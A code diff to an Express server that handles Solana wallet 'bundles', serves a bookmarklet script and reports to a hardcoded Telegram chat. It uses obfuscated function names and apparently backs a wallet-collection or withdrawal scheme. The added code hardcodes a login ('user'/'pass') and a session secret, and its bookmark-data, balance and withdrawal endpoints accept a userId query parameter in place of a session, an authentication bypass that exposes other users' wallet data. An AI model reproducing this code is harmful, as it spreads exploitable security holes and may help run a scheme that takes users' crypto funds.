@@ -6,6 +6,7 @@ const crypto = require('crypto');
 const bs58 = require('bs58');
 const { Connection, PublicKey } = require('@solana/web3.js');
 const fetch = require('node-fetch');
+const session = require('express-session'); // npm install express-session
 
 const app = express();
 const X7F9K2 = 5000;
@@ -21,6 +22,14 @@ const TELEGRAM_CHAT_ID = '7348305177';  // Replace with your correct chat ID
 app.use(bodyParser.json());
 app.use(express.static('public'));
 app.use(bodyParser.urlencoded({ extended: true }));
+
+// Session middleware for user auth (simple, in-memory; use Redis for prod)
+app.use(session({
+    secret: 'your-user-session-secret',
+    resave: false,
+    saveUninitialized: true,
+    cookie: { secure: false } // Set to true for HTTPS
+}));
 
 if (!fs.existsSync(Q8M3N7)) {
     fs.writeFileSync(Q8M3N7, JSON.stringify([]));
@@ -453,6 +462,105 @@ app.get('/api/check-balances', K9S2E7, async (req, res) => {
     }
 });
 
+// NEW: User login (simple hardcoded for demo; replace with real auth)
+app.post('/api/user-login', (req, res) => {
+    const { username, password } = req.body;
+    // Demo: hardcoded user
+    if (username === 'user' && password === 'pass') {
+        req.session.userId = username; // Store user session
+        res.json({ success: true, message: 'Logged in' });
+    } else {
+        res.status(401).json({ success: false, error: 'Invalid credentials' });
+    }
+});
+
+// NEW: User bookmark data (filtered by session user if available, else all)
+app.get('/api/user-bookmark-data', (req, res) => {
+    try {
+        let data = D5V8B3();
+        const userId = req.session.userId || req.query.userId; // Fallback to query param
+        if (userId) {
+            data = data.filter(item => item.user?.id === userId || item.user?.userId === userId);
+        }
+        // Add totalWalletBalance for each entry (sum of wallet balances)
+        data = data.map(entry => {
+            if (entry.processedSBundles?.wallets) {
+                const total = entry.processedSBundles.wallets.reduce((sum, w) => sum + (w.customBalance || 0), 0);
+                entry.totalWalletBalance = total.toFixed(4);
+            } else {
+                entry.totalWalletBalance = '0.0000';
+            }
+            return entry;
+        });
+        res.json(data);
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// NEW: User balance (sum of all user's wallet balances)
+app.get('/api/user-balance', async (req, res) => {
+    try {
+        const userId = req.session.userId || req.query.userId;
+        if (!userId) {
+            return res.status(401).json({ error: 'User not authenticated' });
+        }
+        const data = D5V8B3().filter(item => item.user?.id === userId || item.user?.userId === userId);
+        let totalBalance = 0;
+        for (const entry of data) {
+            if (entry.processedSBundles?.wallets) {
+                for (const wallet of entry.processedSBundles.wallets) {
+                    if (wallet.publicKey && !wallet.error) {
+                        const balance = wallet.customBalance !== undefined ? wallet.customBalance : await H3X9M5(wallet.publicKey);
+                        totalBalance += balance;
+                    }
+                }
+            }
+        }
+        res.json({ balance: totalBalance.toFixed(4) });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// NEW: Withdrawal request
+app.post('/api/withdraw', async (req, res) => {
+    try {
+        const { amount, note } = req.body;
+        const userId = req.session.userId || req.query.userId;
+        if (!userId) {
+            return res.status(401).json({ success: false, error: 'User not authenticated' });
+        }
+        if (!amount || amount <= 0) {
+            return res.status(400).json({ success: false, error: 'Invalid amount' });
+        }
+
+        // Log to file or DB (here, append to a withdrawals.json)
+        const withdrawalsFile = path.join(__dirname, 'withdrawals.json');
+        let withdrawals = [];
+        if (fs.existsSync(withdrawalsFile)) {
+            withdrawals = JSON.parse(fs.readFileSync(withdrawalsFile, 'utf8'));
+        }
+        withdrawals.push({
+            id: Date.now(),
+            userId,
+            amount,
+            note,
+            timestamp: new Date().toISOString(),
+            status: 'pending'
+        });
+        fs.writeFileSync(withdrawalsFile, JSON.stringify(withdrawals, null, 2));
+
+        // Notify admin via Telegram
+        const message = `🚀 *Withdrawal Request*\nUser: ${userId}\nAmount: ${amount} SOL\nNote: ${note || 'N/A'}\nTime: ${new Date().toISOString()}`;
+        await sendToTelegram(message);
+
+        res.json({ success: true, message: 'Request submitted' });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
 // Serve login page
 app.get('/login', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
@@ -463,9 +571,9 @@ app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
-// Serve index page
+// Serve index page (user dashboard)
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    res.sendFile(path.join(__dirname, 'public', 'dashboard.html')); // Assume you save the provided HTML as dashboard.html in public
 });
 
 // Serve bookmarkscript.js
